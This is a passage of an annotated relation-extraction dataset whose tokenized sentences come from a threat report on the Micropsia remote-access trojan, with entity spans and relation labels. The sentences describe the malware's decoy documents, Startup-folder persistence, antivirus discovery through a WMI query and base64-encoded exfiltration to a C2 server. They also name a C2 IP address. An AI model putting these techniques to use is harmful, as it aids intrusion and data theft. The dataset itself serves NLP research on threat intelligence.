server", "pos": [9, 11], "index": "16_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [226, 226], "name": "IP address", "pos": [13, 15], "index": "17_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [228, 228], "name": "43.154.175.230", "pos": [15, 16], "index": "18_0"}]], "labels": [{"r": "FR", "evidence": [0, 1, 2], "h": 2, "t": 7}]}, {"title": "033-0", "sents": [["It", "is", "possible", "that", "the", "bad", "actor", "has", "been", "utilizing", "email", "as", "a", "delivery", "mechanism", "for", "their", "fraudulent", "bait", "and", "malicious", "software", "."], ["The", "harmful", "functionalities", "are", "executed", "via", "timers", "that", "have", "been", "configured", "in", "the", "malware", "."], ["One", "of", "these", "timers", "is", "responsible", "for", "extracting", "a", "decoy", "document", ",", "saving", "it", "at", "%", "TEMP", "%", "directory", ",", "and", "then", "displaying", "it", "with", "ShellExecute", "to", "mislead", "the", "target", "."], ["However", ",", "if", "the", "malware", "is", "started", "with", "the", "``", "-start", "''", "command-line", "switch", ",", "it", "will", "disregard", "the", "process", "of", "dropping", "and", "showcasing", "the", "decoy", "document", "and", "directly", "jump", "to", "the", "RAT", "functions", "."], ["Another", "timer", "is", "utilized", "to", "establish", "persistence", "for", "the", "malware", "on", "the", "endpoint", "."], ["In", "this", "case", ",", "the", "malware", "will", "obtain", "its", "current", "command", "line", "to", "create", "a", "shortcut", "containing", "the", "``", "-start", "''", "switch", "in", "the", "%", "TEMP", "%", "folder", "to", "ensure", "persistence", "."], ["Finally", ",", "this", "shortcut", "is", "moved", "to", "the", "Startup", "folder", "of", "the", "logged-in", "user", "to", "guarantee", "persistence", "across", "reboots", "and", "logins", "."], ["The", "two", "remaining", "timers", "in", "the", "implant", "will", "collect", "system", "information", "and", "enable", "its", "Remote", "Access", "Trojan", "(", "RAT", ")", "capabilities", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [6, 6], "name": "actor", "pos": [6, 7], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [10, 10], "name": "email", "pos": [10, 11], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [36, 36], "name": "malware", "pos": [13, 14], "index": "2_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [41, 41], "name": "timers", "pos": [3, 4], "index": "3_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [47, 47], "name": "decoy document", "pos": [9, 11], "index": "4_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [63, 63], "name": "ShellExecute", "pos": [25, 26], "index": "5_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [73, 73], "name": "malware", "pos": [4, 5], "index": "6_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [104, 104], "name": "Another timer", "pos": [0, 2], "index": "7_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [113, 113], "name": "malware", "pos": [9, 10], "index": "8_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [123, 123], "name": "malware", "pos": [5, 6], "index": "9_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [133, 133], "name": "shortcut", "pos": [15, 16], "index": "10_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [158, 158], "name": "Startup folder", "pos": [8, 10], "index": "11_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [173, 173], "name": "two remaining timers", "pos": [1, 4], "index": "12_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [181, 181], "name": "system information", "pos": [9, 11], "index": "13_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0, 1], "h": 0, "t": 2}, {"r": "WR", "evidence": [0, 1, 2], "h": 0, "t": 4}, {"r": "WR", "evidence": [1, 2], "t": 2, "h": 3}, {"r": "FR", "evidence": [2], "h": 3, "t": 5}, {"r": "RD", "evidence": [2], "t": 4, "h": 5}, {"r": "RD", "evidence": [2, 3], "h": 5, "t": 6}, {"r": "WR", "evidence": [2, 3], "h": 5, "t": 6}, {"r": "EX", "evidence": [2, 3], "h": 5, "t": 6}, {"r": "WR", "evidence": [3, 4], "t": 6, "h": 7}, {"r": "WR", "evidence": [4], "h": 7, "t": 8}, {"r": "EX", "evidence": [4, 5], "h": 7, "t": 9}, {"r": "RD", "evidence": [4, 5, 6], "h": 7, "t": 11}, {"r": "WR", "evidence": [4, 5], "h": 7, "t": 10}, {"r": "WR", "evidence": [4, 5, 6], "h": 7, "t": 11}, {"r": "CO", "evidence": [4, 5], "h": 8, "t": 9}, {"r": "CO", "evidence": [5], "h": 9, "t": 10}]}, {"title": "033-1", "sents": [["The", "harmful", "functionalities", "are", "executed", "via", "timers", "that", "have", "been", "configured", "in", "the", "malware", "."], ["One", "of", "these", "timers", "is", "responsible", "for", "extracting", "a", "decoy", "document", ",", "saving", "it", "at", "%", "TEMP", "%", "directory", ",", "and", "then", "displaying", "it", "with", "ShellExecute", "to", "mislead", "the", "target", "."], ["However", ",", "if", "the", "malware", "is", "started", "with", "the", "``", "-start", "''", "command-line", "switch", ",", "it", "will", "disregard", "the", "process", "of", "dropping", "and", "showcasing", "the", "decoy", "document", "and", "directly", "jump", "to", "the", "RAT", "functions", "."], ["Another", "timer", "is", "utilized", "to", "establish", "persistence", "for", "the", "malware", "on", "the", "endpoint", "."], ["In", "this", "case", ",", "the", "malware", "will", "obtain", "its", "current", "command", "line", "to", "create", "a", "shortcut", "containing", "the", "``", "-start", "''", "switch", "in", "the", "%", "TEMP", "%", "folder", "to", "ensure", "persistence", "."], ["Finally", ",", "this", "shortcut", "is", "moved", "to", "the", "Startup", "folder", "of", "the", "logged-in", "user", "to", "guarantee", "persistence", "across", "reboots", "and", "logins", "."], ["The", "two", "remaining", "timers", "in", "the", "implant", "will", "collect", "system", "information", "and", "enable", "its", "Remote", "Access", "Trojan", "(", "RAT", ")", "capabilities", "."], ["The", "endpoint", "is", "assigned", "a", "unique", "PC", "ID", ",", "which", "is", "saved", "in", "a", "data", "file", "located", "at", "``", "%", "APPDATA", "%", "\\dsfjj45k.tmp", "''", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [13, 13], "name": "malware", "pos": [13, 14], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [18, 18], "name": "timers", "pos": [3, 4], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [24, 24], "name": "decoy document", "pos": [9, 11], "index": "2_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [40, 40], "name": "ShellExecute", "pos": [25, 26], "index": "3_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [50, 50], "name": "malware", "pos": [4, 5], "index": "4_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [81, 81], "name": "Another timer", "pos": [0, 2], "index": "5_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [90, 90], "name": "malware", "pos": [9, 10], "index": "6_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [100, 100], "name": "malware", "pos": [5, 6], "index": "7_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [110, 110], "name": "shortcut", "pos": [15, 16], "index": "8_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [135, 135], "name": "Startup folder", "pos": [8, 10], "index": "9_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [150, 150], "name": "two remaining timers", "pos": [1, 4], "index": "10_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [158, 158], "name": "system information", "pos": [9, 11], "index": "11_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [177, 177], "name": "PC ID", "pos": [6, 8], "index": "12_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [185, 185], "name": "data file", "pos": [14, 16], "index": "13_0"}]], "labels": [{"r": "WR", "evidence": [0, 1], "t": 0, "h": 1}, {"r": "FR", "evidence": [1], "h": 1, "t": 3}, {"r": "RD", "evidence": [1], "t": 2, "h": 3}, {"r": "RD", "evidence": [1, 2], "h": 3, "t": 4}, {"r": "WR", "evidence": [1, 2], "h": 3, "t": 4}, {"r": "EX", "evidence": [1, 2], "h": 3, "t": 4}, {"r": "WR", "evidence": [2, 3], "t": 4, "h": 5}, {"r": "WR", "evidence": [3], "h": 5, "t": 6}, {"r": "EX", "evidence": [3, 4], "h": 5, "t": 7}, {"r": "RD", "evidence": [3, 4, 5], "h": 5, "t": 9}, {"r": "WR", "evidence": [3, 4], "h": 5, "t": 8}, {"r": "WR", "evidence": [3, 4, 5], "h": 5, "t": 9}, {"r": "CO", "evidence": [3, 4], "h": 6, "t": 7}, {"r": "CO", "evidence": [4], "h": 7, "t": 8}, {"r": "WR", "evidence": [6, 7], "h": 10, "t": 13}]}, {"title": "033-2", "sents": [["One", "of", "these", "timers", "is", "responsible", "for", "extracting", "a", "decoy", "document", ",", "saving", "it", "at", "%", "TEMP", "%", "directory", ",", "and", "then", "displaying", "it", "with", "ShellExecute", "to", "mislead", "the", "target", "."], ["However", ",", "if", "the", "malware", "is", "started", "with", "the", "``", "-start", "''", "command-line", "switch", ",", "it", "will", "disregard", "the", "process", "of", "dropping", "and", "showcasing", "the", "decoy", "document", "and", "directly", "jump", "to", "the", "RAT", "functions", "."], ["Another", "timer", "is", "utilized", "to", "establish", "persistence", "for", "the", "malware", "on", "the", "endpoint", "."], ["In", "this", "case", ",", "the", "malware", "will", "obtain", "its", "current", "command", "line", "to", "create", "a", "shortcut", "containing", "the", "``", "-start", "''", "switch", "in", "the", "%", "TEMP", "%", "folder", "to", "ensure", "persistence", "."], ["Finally", ",", "this", "shortcut", "is", "moved", "to", "the", "Startup", "folder", "of", "the", "logged-in", "user", "to", "guarantee", "persistence", "across", "reboots", "and", "logins", "."], ["The", "two", "remaining", "timers", "in", "the", "implant", "will", "collect", "system", "information", "and", "enable", "its", "Remote", "Access", "Trojan", "(", "RAT", ")", "capabilities", "."], ["The", "endpoint", "is", "assigned", "a", "unique", "PC", "ID", ",", "which", "is", "saved", "in", "a", "data", "file", "located", "at", "``", "%", "APPDATA", "%", "\\dsfjj45k.tmp", "''", "."], ["The", "Computername", "and", "username", "of", "the", "infected", "endpoint", "are", "retrieved", "from", "the", "environment", "variables", "and", "merged", "with", "the", "PCID", "to", "create", "a", "concatenated", "string", "in", "the", "following", "format", ":", "<", "COMPNAME", ">", "<", "username", ">", "<", "pcid", ">", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [3, 3], "name": "timers", "pos": [3, 4], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [9, 9], "name": "decoy document", "pos": [9, 11], "index": "1_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [25, 25], "name": "ShellExecute", "pos": [25, 26], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [35, 35], "name": "malware", "pos": [4, 5], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [66, 66], "name": "Another timer", "pos": [0, 2], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [75, 75], "name": "malware", "pos": [9, 10], "index": "5_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [85, 85], "name": "malware", "pos": [5, 6], "index": "6_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [95, 95], "name": "shortcut", "pos": [15, 16], "index": "7_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [120, 120], "name": "Startup folder", "pos": [8, 10], "index": "8_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [135, 135], "name": "two remaining timers", "pos": [1, 4], "index": "9_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [143, 143], "name": "system information", "pos": [9, 11], "index": "10_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [162, 162], "name": "PC ID", "pos": [6, 8], "index": "11_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [170, 170], "name": "data file", "pos": [14, 16], "index": "12_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [182, 182], "name": "Computername and username", "pos": [1, 4], "index": "13_0"}]], "labels": [{"r": "FR", "evidence": [0], "h": 0, "t": 2}, {"r": "RD", "evidence": [0], "t": 1, "h": 2}, {"r": "RD", "evidence": [0, 1], "h": 2, "t": 3}, {"r": "WR", "evidence": [0, 1], "h": 2, "t": 3}, {"r": "EX", "evidence": [0, 1], "h": 2, "t": 3}, {"r": "WR", "evidence": [1, 2], "t": 3, "h": 4}, {"r": "WR", "evidence": [2], "h": 4, "t": 5}, {"r": "EX", "evidence": [2, 3], "h": 4, "t": 6}, {"r": "RD", "evidence": [2, 3, 4], "h": 4, "t": 8}, {"r": "WR", "evidence": [2, 3], "h": 4, "t": 7}, {"r": "WR", "evidence": [2, 3, 4], "h": 4, "t": 8}, {"r": "CO", "evidence": [2, 3], "h": 5, "t": 6}, {"r": "CO", "evidence": [3], "h": 6, "t": 7}, {"r": "WR", "evidence": [5, 6], "h": 9, "t": 12}, {"r": "RD", "evidence": [5, 6, 7], "h": 9, "t": 13}]}, {"title": "033-3", "sents": [["However", ",", "if", "the", "malware", "is", "started", "with", "the", "``", "-start", "''", "command-line", "switch", ",", "it", "will", "disregard", "the", "process", "of", "dropping", "and", "showcasing", "the", "decoy", "document", "and", "directly", "jump", "to", "the", "RAT", "functions", "."], ["Another", "timer", "is", "utilized", "to", "establish", "persistence", "for", "the", "malware", "on", "the", "endpoint", "."], ["In", "this", "case", ",", "the", "malware", "will", "obtain", "its", "current", "command", "line", "to", "create", "a", "shortcut", "containing", "the", "``", "-start", "''", "switch", "in", "the", "%", "TEMP", "%", "folder", "to", "ensure", "persistence", "."], ["Finally", ",", "this", "shortcut", "is", "moved", "to", "the", "Startup", "folder", "of", "the", "logged-in", "user", "to", "guarantee", "persistence", "across", "reboots", "and", "logins", "."], ["The", "two", "remaining", "timers", "in", "the", "implant", "will", "collect", "system", "information", "and", "enable", "its", "Remote", "Access", "Trojan", "(", "RAT", ")", "capabilities", "."], ["The", "endpoint", "is", "assigned", "a", "unique", "PC", "ID", ",", "which", "is", "saved", "in", "a", "data", "file", "located", "at", "``", "%", "APPDATA", "%", "\\dsfjj45k.tmp", "''", "."], ["The", "Computername", "and", "username", "of", "the", "infected", "endpoint", "are", "retrieved", "from", "the", "environment", "variables", "and", "merged", "with", "the", "PCID", "to", "create", "a", "concatenated", "string", "in", "the", "following", "format", ":", "<", "COMPNAME", ">", "<", "username", ">", "<", "pcid", ">", "."], ["Details", "about", "any", "installed", "antivirus", "software", "are", "obtained", "using", "a", "query", "``", "SELECT", "*", "FROM", "AntiVirusProduct", "''", "executed", "via", "``", "winmgmts", ":", "\\localhost\\root\\SecurityCenter2", "''", ",", "and", "the", "DisplayName", "is", "recorded", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [4, 4], "name": "malware", "pos": [4, 5], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [35, 35], "name": "Another timer", "pos": [0, 2], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [44, 44], "name": "malware", "pos": [9, 10], "index": "2_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [54, 54], "name": "malware", "pos": [5, 6], "index": "3_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [64, 64], "name": "shortcut", "pos": [15, 16], "index": "4_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [89, 89], "name": "Startup folder", "pos": [8, 10], "index": "5_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [104, 104], "name": "two remaining timers", "pos": [1, 4], "index": "6_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [112, 112], "name": "system information", "pos": [9, 11], "index": "7_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [131, 131], "name": "PC ID", "pos": [6, 8], "index": "8_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [139, 139], "name": "data file", "pos": [14, 16], "index": "9_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [151, 151], "name": "Computername and username", "pos": [1, 4], "index": "10_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [192, 192], "name": "installed antivirus software", "pos": [3, 6], "index": "11_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [216, 216], "name": "DisplayName", "pos": [27, 28], "index": "12_0"}]], "labels": [{"r": "WR", "evidence": [0, 1], "t": 0, "h": 1}, {"r": "WR", "evidence": [1], "h": 1, "t": 2}, {"r": "EX", "evidence": [1, 2], "h": 1, "t": 3}, {"r": "RD", "evidence": [1, 2, 3], "h": 1, "t": 5}, {"r": "WR", "evidence": [1, 2], "h": 1, "t": 4}, {"r": "WR", "evidence": [1, 2, 3], "h": 1, "t": 5}, {"r": "CO", "evidence": [1, 2], "h": 2, "t": 3}, {"r": "CO", "evidence": [2], "h": 3, "t": 4}, {"r": "WR", "evidence": [4, 5], "h": 6, "t": 9}, {"r": "RD", "evidence": [4, 5, 6], "h": 6, "t": 10}, {"r": "RD", "evidence": [4, 5, 6, 7], "h": 6, "t": 11}, {"r": "WR", "evidence": [4, 5, 6, 7], "h": 6, "t": 12}]}, {"title": "033-4", "sents": [["Another", "timer", "is", "utilized", "to", "establish", "persistence", "for", "the", "malware", "on", "the", "endpoint", "."], ["In", "this", "case", ",", "the", "malware", "will", "obtain", "its", "current", "command", "line", "to", "create", "a", "shortcut", "containing", "the", "``", "-start", "''", "switch", "in", "the", "%", "TEMP", "%", "folder", "to", "ensure", "persistence", "."], ["Finally", ",", "this", "shortcut", "is", "moved", "to", "the", "Startup", "folder", "of", "the", "logged-in", "user", "to", "guarantee", "persistence", "across", "reboots", "and", "logins", "."], ["The", "two", "remaining", "timers", "in", "the", "implant", "will", "collect", "system", "information", "and", "enable", "its", "Remote", "Access", "Trojan", "(", "RAT", ")", "capabilities", "."], ["The", "endpoint", "is", "assigned", "a", "unique", "PC", "ID", ",", "which", "is", "saved", "in", "a", "data", "file", "located", "at", "``", "%", "APPDATA", "%", "\\dsfjj45k.tmp", "''", "."], ["The", "Computername", "and", "username", "of", "the", "infected", "endpoint", "are", "retrieved", "from", "the", "environment", "variables", "and", "merged", "with", "the", "PCID", "to", "create", "a", "concatenated", "string", "in", "the", "following", "format", ":", "<", "COMPNAME", ">", "<", "username", ">", "<", "pcid", ">", "."], ["Details", "about", "any", "installed", "antivirus", "software", "are", "obtained", "using", "a", "query", "``", "SELECT", "*", "FROM", "AntiVirusProduct", "''", "executed", "via", "``", "winmgmts", ":", "\\localhost\\root\\SecurityCenter2", "''", ",", "and", "the", "DisplayName", "is", "recorded", "."], ["The", "name", "of", "the", "installed", "operating", "system", "product", "is", "also", "obtained", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [0, 0], "name": "Another timer", "pos": [0, 2], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [9, 9], "name": "malware", "pos": [9, 10], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [19, 19], "name": "malware", "pos": [5, 6], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [29, 29], "name": "shortcut", "pos": [15, 16], "index": "3_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [54, 54], "name": "Startup folder", "pos": [8, 10], "index": "4_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [69, 69], "name": "two remaining timers", "pos": [1, 4], "index": "5_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [77, 77], "name": "system information", "pos": [9, 11], "index": "6_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [96, 96], "name": "PC ID", "pos": [6, 8], "index": "7_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [104, 104], "name": "data file", "pos": [14, 16], "index": "8_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [116, 116], "name": "Computername and username", "pos": [1, 4], "index": "9_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [157, 157], "name": "installed antivirus software", "pos": [3, 6], "index": "10_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [181, 181], "name": "DisplayName", "pos": [27, 28], "index": "11_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [186, 186], "name": "name", "pos": [1, 2], "index": "12_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "EX", "evidence": [0, 1], "h": 0, "t": 2}, {"r": "RD", "evidence": [0, 1, 2], "h": 0, "t": 4}, {"r": "WR", "evidence": [0, 1], "h": 0, "t": 3}, {"r": "WR", "evidence": [0, 1, 2], "h": 0, "t": 4}, {"r": "RD", "evidence": [0, 1, 2, 3, 4, 5, 6, 7], "h": 0, "t": 12}, {"r": "CO", "evidence": [0, 1], "h": 1, "t": 2}, {"r": "CO", "evidence": [1], "h": 2, "t": 3}, {"r": "WR", "evidence": [3, 4], "h": 5, "t": 8}, {"r": "RD", "evidence": [3, 4, 5], "h": 5, "t": 9}, {"r": "RD", "evidence": [3, 4, 5, 6], "h": 5, "t": 10}, {"r": "WR", "evidence": [3, 4, 5, 6], "h": 5, "t": 11}]}, {"title": "033-5", "sents": [["In", "this", "case", ",", "the", "malware", "will", "obtain", "its", "current", "command", "line", "to", "create", "a", "shortcut", "containing", "the", "``", "-start", "''", "switch", "in", "the", "%", "TEMP", "%", "folder", "to", "ensure", "persistence", "."], ["Finally", ",", "this", "shortcut", "is", "moved", "to", "the", "Startup", "folder", "of", "the", "logged-in", "user", "to", "guarantee", "persistence", "across", "reboots", "and", "logins", "."], ["The", "two", "remaining", "timers", "in", "the", "implant", "will", "collect", "system", "information", "and", "enable", "its", "Remote", "Access", "Trojan", "(", "RAT", ")", "capabilities", "."], ["The", "endpoint", "is", "assigned", "a", "unique", "PC", "ID", ",", "which", "is", "saved", "in", "a", "data", "file", "located", "at", "``", "%", "APPDATA", "%", "\\dsfjj45k.tmp", "''", "."], ["The", "Computername", "and", "username", "of", "the", "infected", "endpoint", "are", "retrieved", "from", "the", "environment", "variables", "and", "merged", "with", "the", "PCID", "to", "create", "a", "concatenated", "string", "in", "the", "following", "format", ":", "<", "COMPNAME", ">", "<", "username", ">", "<", "pcid", ">", "."], ["Details", "about", "any", "installed", "antivirus", "software", "are", "obtained", "using", "a", "query", "``", "SELECT", "*", "FROM", "AntiVirusProduct", "''", "executed", "via", "``", "winmgmts", ":", "\\localhost\\root\\SecurityCenter2", "''", ",", "and", "the", "DisplayName", "is", "recorded", "."], ["The", "name", "of", "the", "installed", "operating", "system", "product", "is", "also", "obtained", "."], ["Additionally", ",", "the", "current", "Micropsia", "implant", "command", "line", "is", "obtained", "and", "recorded", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [5, 5], "name": "malware", "pos": [5, 6], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [15, 15], "name": "shortcut", "pos": [15, 16], "index": "1_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [40, 40], "name": "Startup folder", "pos": [8, 10], "index": "2_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [55, 55], "name": "two remaining timers", "pos": [1, 4], "index": "3_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [63, 63], "name": "system information", "pos": [9, 11], "index": "4_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [82, 82], "name": "PC ID", "pos": [6, 8], "index": "5_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [90, 90], "name": "data file", "pos": [14, 16], "index": "6_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [102, 102], "name": "Computername and username", "pos": [1, 4], "index": "7_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [143, 143], "name": "installed antivirus software", "pos": [3, 6], "index": "8_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [167, 167], "name": "DisplayName", "pos": [27, 28], "index": "9_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [172, 172], "name": "name", "pos": [1, 2], "index": "10_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [189, 189], "name": "command line", "pos": [6, 8], "index": "11_0"}]], "labels": [{"r": "CO", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [2, 3], "h": 3, "t": 6}, {"r": "RD", "evidence": [2, 3, 4], "h": 3, "t": 7}, {"r": "RD", "evidence": [2, 3, 4, 5], "h": 3, "t": 8}, {"r": "WR", "evidence": [2, 3, 4, 5], "h": 3, "t": 9}, {"r": "WR", "evidence": [2, 3, 4, 5, 6, 7], "h": 3, "t": 11}]}, {"title": "033-6", "sents": [["Finally", ",", "this", "shortcut", "is", "moved", "to", "the", "Startup", "folder", "of", "the", "logged-in", "user", "to", "guarantee", "persistence", "across", "reboots", "and", "logins", "."], ["The", "two", "remaining", "timers", "in", "the", "implant", "will", "collect", "system", "information", "and", "enable", "its", "Remote", "Access", "Trojan", "(", "RAT", ")", "capabilities", "."], ["The", "endpoint", "is", "assigned", "a", "unique", "PC", "ID", ",", "which", "is", "saved", "in", "a", "data", "file", "located", "at", "``", "%", "APPDATA", "%", "\\dsfjj45k.tmp", "''", "."], ["The", "Computername", "and", "username", "of", "the", "infected", "endpoint", "are", "retrieved", "from", "the", "environment", "variables", "and", "merged", "with", "the", "PCID", "to", "create", "a", "concatenated", "string", "in", "the", "following", "format", ":", "<", "COMPNAME", ">", "<", "username", ">", "<", "pcid", ">", "."], ["Details", "about", "any", "installed", "antivirus", "software", "are", "obtained", "using", "a", "query", "``", "SELECT", "*", "FROM", "AntiVirusProduct", "''", "executed", "via", "``", "winmgmts", ":", "\\localhost\\root\\SecurityCenter2", "''", ",", "and", "the", "DisplayName", "is", "recorded", "."], ["The", "name", "of", "the", "installed", "operating", "system", "product", "is", "also", "obtained", "."], ["Additionally", ",", "the", "current", "Micropsia", "implant", "command", "line", "is", "obtained", "and", "recorded", "."], ["Each", "item", "of", "data", "collected", "is", "base64-encoded", "and", "assigned", "to", "an", "HTTP", "form", "query", "variable", "with", "a", "corresponding", "name-value", "pair", "."]], "vertexSet": [[{"type": "SF", "sent_id": 0, "global_pos": [8, 8], "name": "Startup folder", "pos": [8, 10], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [23, 23], "name": "two remaining timers", "pos": [1, 4], "index": "1_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [31, 31], "name": "system information", "pos": [9, 11], "index": "2_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [50, 50], "name": "PC ID", "pos": [6, 8], "index": "3_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [58, 58], "name": "data file", "pos": [14, 16], "index": "4_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [70, 70], "name": "Computername and username", "pos": [1, 4], "index": "5_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [111, 111], "name": "installed antivirus software", "pos": [3, 6], "index": "6_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [135, 135], "name": "DisplayName", "pos": [27, 28], "index": "7_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [140, 140], "name": "name", "pos": [1, 2], "index": "8_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [157, 157], "name": "command line", "pos": [6, 8], "index": "9_0"}]], "labels": [{"r": "WR", "evidence": [1, 2], "h": 1, "t": 4}, {"r": "RD", "evidence": [1, 2, 3], "h": 1, "t": 5}, {"r": "RD", "evidence": [1, 2, 3, 4], "h": 1, "t": 6}, {"r": "WR", "evidence": [1, 2, 3, 4], "h": 1, "t": 7}, {"r": "WR", "evidence": [1, 2, 3, 4, 5, 6], "h": 1, "t": 9}]}, {"title": "033-7", "sents": [["The", "two", "remaining", "timers", "in", "the", "implant", "will", "collect", "system", "information", "and", "enable", "its", "Remote", "Access", "Trojan", "(", "RAT", ")", "capabilities", "."], ["The", "endpoint", "is", "assigned", "a", "unique", "PC", "ID", ",", "which", "is", "saved", "in", "a", "data", "file", "located", "at", "``", "%", "APPDATA", "%", "\\dsfjj45k.tmp", "''", "."], ["The", "Computername", "and", "username", "of", "the", "infected", "endpoint", "are", "retrieved", "from", "the", "environment", "variables", "and", "merged", "with", "the", "PCID", "to", "create", "a", "concatenated", "string", "in", "the", "following", "format", ":", "<", "COMPNAME", ">", "<", "username", ">", "<", "pcid", ">", "."], ["Details", "about", "any", "installed", "antivirus", "software", "are", "obtained", "using", "a", "query", "``", "SELECT", "*", "FROM", "AntiVirusProduct", "''", "executed", "via", "``", "winmgmts", ":", "\\localhost\\root\\SecurityCenter2", "''", ",", "and", "the", "DisplayName", "is", "recorded", "."], ["The", "name", "of", "the", "installed", "operating", "system", "product", "is", "also", "obtained", "."], ["Additionally", ",", "the", "current", "Micropsia", "implant", "command", "line", "is", "obtained", "and", "recorded", "."], ["Each", "item", "of", "data", "collected", "is", "base64-encoded", "and", "assigned", "to", "an", "HTTP", "form", "query", "variable", "with", "a", "corresponding", "name-value", "pair", "."], ["Finally", ",", "this", "data", "is", "sent", "to", "the", "C2", "server", "over", "HTTP", "POST", "request", "using", "the", "standard", "protocol", "employed", "by", "Micropsia", "implants", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "two remaining timers", "pos": [1, 4], "index": "0_0"}], [{"type": "TF", "sent_id": 0, "global_pos": [9, 9], "name": "system information", "pos": [9, 11], "index": "1_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [28, 28], "name": "PC ID", "pos": [6, 8], "index": "2_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [36, 36], "name": "data file", "pos": [14, 16], "index": "3_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [48, 48], "name": "Computername and username", "pos": [1, 4], "index": "4_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [89, 89], "name": "installed antivirus software", "pos": [3, 6], "index": "5_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [113, 113], "name": "DisplayName", "pos": [27, 28], "index": "6_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [118, 118], "name": "name", "pos": [1, 2], "index": "7_0"}], [{"type": 